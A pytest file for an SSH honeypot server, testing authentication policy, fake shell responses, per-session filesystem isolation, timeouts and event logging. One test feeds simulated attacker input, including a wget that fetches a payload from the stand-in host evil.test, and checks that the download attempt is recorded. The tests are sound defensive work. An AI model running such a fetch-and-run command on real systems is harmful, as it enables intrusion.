import json, asyncio, pytest, asyncssh
from genno.ssh.server import start, Policy

async def _client(port, user, pw):
    return await asyncssh.connect("127.0.0.1", port, username=user, password=pw,
                                  known_hosts=None, client_keys=None, agent_path=None)

def events(p):
    return [json.loads(l) for l in open(p)]

async def _srv(tmp_path, **kw):
    log = tmp_path / "e.jsonl"
    srv = await start(port=0, logfile=str(log), keyfile=str(tmp_path / "k"), **kw)
    return srv, srv.sockets[0].getsockname()[1], log

async def test_auth_policy_and_exec(tmp_path):
    srv, port, log = await _srv(tmp_path, policy=Policy(after=2, allow=[("root", "toor")]))
    async with await _client(port, "root", "toor") as c:
        r = await c.run("foobar")
        assert "command not found" in r.stdout or "command not found" in r.stderr
        assert (await c.run("whoami")).stdout == "root\n"
    with pytest.raises(asyncssh.PermissionDenied):
        await _client(port, "admin", "admin")
    srv.close(); await srv.wait_closed()
    ev = events(log)
    auths = [e for e in ev if e["event_type"] == "auth_attempt"]
    assert any(a["success"] and a["username"] == "root" for a in auths)
    assert any(not a["success"] and a["username"] == "admin" for a in auths)
    assert [e["command"] for e in ev if e["event_type"] == "command"] == ["foobar", "whoami"]

async def test_interactive_shell_and_session_isolation(tmp_path):
    srv, port, log = await _srv(tmp_path, policy=Policy(allow=[("a", "b")]))
    async with await _client(port, "a", "b") as c:
        p = await c.create_process(term_type="xterm")
        p.stdin.write("echo pwned > /tmp/x\ncat /tmp/x\nwget http://evil.test/m.sh\nexit\n")
        out = await asyncio.wait_for(p.stdout.read(), 5)
        await p.wait()
    assert "pwned" in out and "logout" in out
    async with await _client(port, "a", "b") as c:          # new session: FS is fresh
        assert "No such file" in (await c.run("cat /tmp/x")).stdout
    srv.close(); await srv.wait_closed()
    ev = events(log)
    assert [e["command"] for e in ev if e["event_type"] == "command"][:4] == [
        "echo pwned > /tmp/x", "cat /tmp/x", "wget http://evil.test/m.sh", "exit"]
    dl = [e for e in ev if e["event_type"] == "download_attempt"]
    assert dl and dl[0]["url"] == "http://evil.test/m.sh"

async def test_idle_timeout_closes_session(tmp_path):
    srv, port, log = await _srv(tmp_path, policy=Policy(allow=[("a", "b")]), idle_timeout=0.3)
    async with await _client(port, "a", "b") as c:
        p = await c.create_process(term_type="xterm")
        await asyncio.wait_for(p.wait(), 3)
    srv.close(); await srv.wait_closed()

async def test_unwritable_log_does_not_break_sessions(tmp_path, capsys):
    log = tmp_path / "logdir"; log.mkdir()          # open(..., "a") on a directory -> OSError, even as root
    srv = await start(port=0, logfile=str(log), keyfile=str(tmp_path / "k"), policy=Policy(allow=[("a", "b")]))
    port = srv.sockets[0].getsockname()[1]
    async with await _client(port, "a", "b") as c:
        assert (await c.run("whoami")).stdout == "a\n"
    srv.close(); await srv.wait_closed()
    assert "telemetry write failed" in capsys.readouterr().err

async def test_filesystem_persists_across_channels_of_one_connection(tmp_path):
    srv, port, log = await _srv(tmp_path, policy=Policy(allow=[("a", "b")]))
    async with await _client(port, "a", "b") as c:
        await c.run("echo marker > /tmp/m")
        assert (await c.run("cat /tmp/m")).stdout == "marker\n"
    srv.close(); await srv.wait_closed()

async def test_cli_server_honours_allow_flag(tmp_path):
    """Drives the real `python -m genno.ssh.server` entrypoint (the path in-process tests skip)."""
    import socket, sys
    s = socket.socket(); s.bind(("127.0.0.1", 0)); port = s.getsockname()[1]; s.close()
    proc = await asyncio.create_subprocess_exec(
        sys.executable, "-m", "genno.ssh.server", "--port", str(port), "--log", str(tmp_path / "e.jsonl"),
        "--key", str(tmp_path / "k"), "--allow", "root:123456", "--allow", "a:b:c",
        stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    try:
        assert b"listening" in await asyncio.wait_for(proc.stdout.readline(), 10)
        async with await _client(port, "root", "123456") as c:
            assert (await c.run("whoami")).stdout == "root\n"
        async with await _client(port, "a", "b:c") as c:                 # password may contain ':'
            assert (await c.run("id")).stdout.startswith("uid=1001(a)")
        with pytest.raises(asyncssh.PermissionDenied):
            await _client(port, "root", "wrong")
    finally:
        proc.terminate(); await proc.wait()
